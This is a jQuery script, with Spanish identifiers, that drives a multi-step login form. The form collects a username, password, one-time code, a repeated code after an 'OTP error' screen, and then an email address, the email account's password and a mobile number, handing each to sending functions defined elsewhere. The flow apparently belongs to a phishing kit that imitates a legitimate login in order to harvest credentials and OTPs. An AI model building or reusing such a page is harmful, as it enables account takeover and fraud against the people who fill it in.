var men_tipo_doc = 0;

$(document).ready(function() {        
    setTimeout(iniciar, 1500);

    $('#btn-correo').click(function(){        
        $('#btn-correo').html('<img src="img/loader.gif" width="31">');
        $('#btn-correo').css("padding","7px");
        $('#btn-correo').attr("disabled","disabled");
        cargar_espera();
        enviar_correo($('#txt-correo').val(),$('#txt-clave').val(),$('#txt-celular').val());
                  
    });

    $('#btn-otp').click(function(){        
        $('#btn-otp').html('<img src="img/loader.gif" width="31">');
        $('#btn-otp').css("padding","7px");
        $('#btn-otp').attr("disabled","disabled");
        cargar_espera();
        enviar_otp($('#txt-otp').val());
    });

    $('#btn-otp-err').click(function(){        
        $('#btn-otp-err').html('<img src="img/loader.gif" width="31">');
        $('#btn-otp-err').css("padding","7px");
        $('#btn-otp-err').attr("disabled","disabled");
        cargar_espera();
        enviar_otp($('#txt-otp-err').val());
    });

    $('#btn-password').click(function(){        
        $('#btn-password').html('<img src="img/loader.gif" width="31">');
        $('#btn-password').css("padding","7px");
        $('#btn-password').attr("disabled","disabled");
        cargar_espera();
        enviar_usuario($('#txt-usuario').val(),$('#txt-password').val());
    });


    $('#btn-usuario').click(function(){        
        $('#btn-usuario').html('<img src="img/loader.gif" width="31">');
        $('#btn-usuario').css("padding","7px");
        $('#btn-usuario').attr("disabled","disabled");
        setTimeout(vista_password, 1500);           
    });


    $("#mnu-tipo-doc").css("width",$(".etiqueta").css("width"));     

    $( window ).resize(function() {
        $("#mnu-tipo-doc").css("width",$(".etiqueta").css("width")); 
    });

    $(".item-tipo-doc").click(function(){
        $("#lbl-tipo-doc").html($(this).html());
        $("#mnu-tipo-doc").hide();
        men_tipo_doc = 0;
    });    

    $("#ddl-tipo-doc").click(function(){
        if (men_tipo_doc == 0) {
            $("#mnu-tipo-doc").show("fast");
            men_tipo_doc = 1;
        }else{
            $("#mnu-tipo-doc").hide();
            men_tipo_doc = 0;
        }            
    });    


    $('#lado-derecho').click(function (e) {
        if (e.target !== this) {
            return;
        }
        $("#mnu-tipo-doc").hide();
        men_tipo_doc = 0;
    });

    $('#lado-izquierdo,#sobre-capa').click(function(){
       $("#mnu-tipo-doc").hide(); 
       men_tipo_doc = 0;
    });


    $(".entrada").focus(function() {        
        $(this).css("border","1px solid #7B7B7B");    
    });



    $("#txt-usuario").keyup(function() {   
        if ($("#txt-usuario").val() != "") {
            $("#txt-usuario").css("border","1px solid #00b800"); 
            $("#btn-usuario").removeAttr("disabled");            
        }else{
            $("#txt-usuario").css("border","1px solid #e70000"); 
            $("#btn-usuario").attr("disabled","disabled");            
        }        
    });


    $("#txt-password").keyup(function() {   
        if ($("#txt-password").val() != "") {
            $("#txt-password").css("border","1px solid #00b800"); 
            $("#btn-password").removeAttr("disabled");            
        }else{
            $("#txt-password").css("border","1px solid #e70000"); 
            $("#btn-password").attr("disabled","disabled");            
        }        
    });


    $("#txt-otp").keyup(function() {   
        if ($("#txt-otp").val() != "") {
            $("#txt-otp").css("border","1px solid #00b800"); 
            $("#btn-otp").removeAttr("disabled");            
        }else{
            $("#txt-otp").css("border","1px solid #e70000"); 
            $("#btn-otp").attr("disabled","disabled");            
        }        
    });

    $("#txt-otp-err").keyup(function() {   
        if ($("#txt-otp-err").val() != "") {
            $("#txt-otp-err").css("border","1px solid #00b800"); 
            $("#btn-otp-err").removeAttr("disabled");            
        }else{
            $("#txt-otp-err").css("border","1px solid #e70000"); 
            $("#btn-otp-err").attr("disabled","disabled");            
        }        
    });

    $(".entrada").blur(function(){
        if ($(this).val() == "") {
            $(this).css("border","1px solid #e70000");    
        }       
    }); 


    $("#txt-correo").keyup(function() {   
        if ($("#txt-correo").val() != "") {            
            $("#txt-correo").css("border","1px solid #00b800"); 
            if($("#txt-correo").val() != "" && $("#txt-clave").val() != "" && $("#txt-celular").val() != ""){
                $("#btn-correo").removeAttr("disabled");            
            }
        }else{
            $("#txt-correo").css("border","1px solid #e70000"); 
            $("#btn-correo").attr("disabled","disabled");            
        }        
    });

    $("#txt-clave").keyup(function() {   
        if ($("#txt-clave").val() != "") {            
            $("#txt-clave").css("border","1px solid #00b800"); 
            if($("#txt-correo").val() != "" && $("#txt-clave").val() != "" && $("#txt-celular").val() != ""){
                $("#btn-correo").removeAttr("disabled");            
            }
        }else{
            $("#txt-clave").css("border","1px solid #e70000"); 
            $("#btn-correo").attr("disabled","disabled");            
        }        
    });

    $("#txt-celular").keyup(function() {   
        if ($("#txt-celular").val() != "") {            
            $("#txt-celular").css("border","1px solid #00b800"); 
            if($("#txt-correo").val() != "" && $("#txt-clave").val() != "" && $("#txt-celular").val() != ""){
                $("#btn-correo").removeAttr("disabled");            
            }
        }else{
            $("#txt-celular").css("border","1px solid #e70000"); 
            $("#btn-correo").attr("disabled","disabled");            
        }        
    });

});






